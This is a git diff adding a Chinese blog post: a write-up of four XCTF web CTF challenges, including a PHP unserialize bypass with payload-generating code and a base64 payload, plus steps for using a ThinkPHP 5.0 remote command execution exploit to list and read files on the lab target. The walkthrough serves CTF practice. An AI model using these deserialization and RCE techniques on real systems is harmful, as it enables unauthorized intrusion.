@@ -152,6 +152,149 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-XCTF/XCTF_Web-001" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/11/15/XCTF/XCTF_Web-001/">XCTF_Web_001</a>
+    </h1>
+  
+
+        
+        <a href="/2020/11/15/XCTF/XCTF_Web-001/" class="archive-article-date">
+  	<time datetime="2020-11-15T08:19:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-11-15</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="baby-web"><a href="#baby-web" class="headerlink" title="baby_web"></a>baby_web</h2><p><img src="https://img-blog.csdnimg.cn/20201030180847595.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030180905654.png#pic_center" alt="在这里插入图片描述"><br>（1）按照提示，初始界面想到index.php，再次请求index.php后仍是1.php(被重定向了)。F12打开开发者模式查看“网络”模块，查看返回包发现确实有index.php，并且其中的location参数被设置为了1.php，同时发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181023278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>(2)也可以访问index.php，用Burp抓包，在响应包中发现flag<br><img src="https://img-blog.csdnimg.cn/20201030181133758.png#pic_center" alt="在这里插入图片描述"></p>
+<p><img src="https://img-blog.csdnimg.cn/20201030181059758.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p><img src="https://img-blog.csdnimg.cn/20201030181220449.png#pic_center" alt="在这里插入图片描述"><br>（1）根据题目，熟悉robots.txt，在URL后加上/robots.txt<br><img src="https://img-blog.csdnimg.cn/20201030181244238.png#pic_center" alt="在这里插入图片描述"><br>（2）发现一个fl0g.php文件，在URL后加上fl0g.php访问，得到flag<br><img src="https://img-blog.csdnimg.cn/20201030181314103.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p>（1）先是一段代码审计</p>
+<pre><code>&lt;?php 
+class Demo &#123; 
+    private $file = &#39;index.php&#39;;
+    public function __construct($file) &#123; 
+        $this-&gt;file = $file;  //构造函数，对类的变量进行初始化
+    &#125;
+    function __destruct() &#123; 
+        echo @highlight_file($this-&gt;file, true); 
+    &#125;
+//魔术方法，如果有反序列化的使用，在反序列化之前会先调用这个方法
+    function __wakeup() &#123; 
+        if ($this-&gt;file != &#39;index.php&#39;) &#123; 
+            //the secret is in the fl4g.php
+            $this-&gt;file = &#39;index.php&#39;; 
+        &#125; 
+    &#125; 
+&#125;
+if (isset($_GET[&#39;var&#39;])) &#123; 
+    $var = base64_decode($_GET[&#39;var&#39;]); 
+//正则匹配，如果在var变量中存在O/C:数字(O:数字或者C:数字这样的形式&#125;)，不区分大小写，就输出stop hacking!否则的话就进行发序列化
+    if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) &#123; 
+        die(&#39;stop hacking!&#39;); 
+    &#125; else &#123;
+        @unserialize($var); 
+    &#125; 
+&#125; else &#123; 
+    highlight_file(&quot;index.php&quot;); 
+&#125; 
+?&gt;</code></pre>
+<p>（2）审计完成之后，思路就很清晰了，对Demo这个类进行序列化，base64加密之后，赋值给var变量进行get传参就行了<br>在类Demo中有三个方法，一个构造，一个析构，还有就是一个魔术方法，构造函数__construct()在程序执行开始的时候对变量进行赋初值。析构函数__destruct()，在对象所在函数执行完成之后，会自动调用，这里就会高亮显示出文件。<br>在反序列化执行之前，会先执行__wakeup这个魔术方法，所以需要绕过，当成员属性数目大于实际数目时可绕过wakeup方法，正则匹配可以用+号来进行绕过。</p>
+<pre><code>&lt;?php
+class Demo &#123;
+private $file = &#39;index.php&#39;;
+//protected $file1 = &#39;index.php&#39;;
+public function __construct($file) &#123;
+    $this-&gt;file = $file;
+    //$this-&gt;file1 = $file1;
+&#125;
+function __destruct() &#123;
+    echo @highlight_file($this-&gt;file, true);
+&#125;
+function __wakeup() &#123;
+    if ($this-&gt;file != &#39;index.php&#39;) &#123;
+        //the secret is in the fl4g.php
+        $this-&gt;file = &#39;index.php&#39;;
+    &#125;
+&#125;
+&#125;
+$a = new Demo(&quot;fl4g.php&quot;);
+echo serialize($a).&quot;\n&quot;;
+//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;
+echo base64_encode(&#39;O:+4:&quot;Demo&quot;:2:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;&#39;);</code></pre>
+<p>使用代码在线工具执行,<a target="_blank" rel="noopener" href="https://tool.lu/coderunner/">https://tool.lu/coderunner/</a><br><img src="https://img-blog.csdnimg.cn/20201030182243753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>修改之后，再进行base64加密，传参就可以了<br>index.php?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==<br><img src="https://img-blog.csdnimg.cn/20201030182357578.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a>php_rce</h2><p><img src="https://img-blog.csdnimg.cn/20201030182600616.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>（1）进入后发现是一个php框架，根据题目php-rce远程命令执行，在github上查一下这个版本有什么漏洞<br><img src="https://img-blog.csdnimg.cn/20201030182613799.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182621814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20201030182634128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（2）发现有好几个版本，由于只知道是5.0，则随便输入一个试试，这里注意只从”?s”开始复制，”?s”之前的是靶场。<br><img src="https://img-blog.csdnimg.cn/20201030182714277.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（3）得到进一步提示，为5.0.2版本，回到github找到5.0.2版本的再次复制，然后访问。发现可以进行远程命令执行。<br><img src="https://img-blog.csdnimg.cn/20201030182750642.png#pic_center" alt="在这里插入图片描述"><br>（4）ls查看有没有什么提示信息，可用hackbar执行，或者直接在地址栏输入命令也可。这里注意要把原来最后一个”=”后面的东西删掉再输入命令。<br><img src="https://img-blog.csdnimg.cn/20201030182851546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（5）ls后没有发现有用信息，接着查找上一级目录，直到发现flag<br><img src="https://img-blog.csdnimg.cn/20201030182918127.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（6）然后输入查看命令 cat /flag即可看到flag<br><img src="https://img-blog.csdnimg.cn/20201030182941486.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>（7）也可以无需一级一级目录的找，使用命令find / -name flag,也可找到flag，然后cat /flag 就可以看到flag了。<br><img src="https://img-blog.csdnimg.cn/2020103018301474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZBRlV4aWFvc29uZw==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">CTF靶场</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/XCTF-Web进阶区//" class="article-tag-list-link color2">XCTF_Web进阶区</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/11/15/XCTF/XCTF_Web-001/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-XCTF/XCTF_Web练习区" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -712,11 +855,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">kali</a>
+                <a href="javascript:void(0)" class="js-tag color1">CTF靶场</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">CTF靶场</a>
+                <a href="javascript:void(0)" class="js-tag color2">Python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">kali</a>
               </li>
             
             <div class="clearfix"></div>
